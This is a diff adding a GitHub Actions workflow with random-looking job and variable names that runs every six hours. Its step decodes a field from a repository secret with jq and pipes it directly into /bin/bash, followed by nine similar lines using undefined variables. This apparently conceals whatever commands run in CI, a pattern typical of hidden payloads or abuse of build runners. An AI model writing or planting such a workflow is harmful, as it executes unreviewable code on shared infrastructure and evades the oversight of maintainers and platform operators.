@@ -1,0 +1,25 @@
+name: gutouru7465
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gutouru7465
+        env:
+          tvvvc2601: ${{ secrets.tvvvc2601 }}
+        run: |
+          echo $tvvvc2601 | jq -r .ujxp6302 | /bin/bash
+          echo $gqqti3100 | jq -r .yeho55569 | /bin/bash
+          echo $nsm9 | jq -r .x29 | /bin/bash
+          echo $dwi713 | jq -r .tgxz7303 | /bin/bash
+          echo $jy223 | jq -r .nxbu40666 | /bin/bash
+          echo $xjxa0 | jq -r .aikff432 | /bin/bash
+          echo $jnp1 | jq -r .m7909 | /bin/bash
+          echo $gmvjw87557 | jq -r .dosn308 | /bin/bash
+          echo $ma27 | jq -r .fthbf953 | /bin/bash
+          echo $jgt74 | jq -r .o4386 | /bin/bash
+
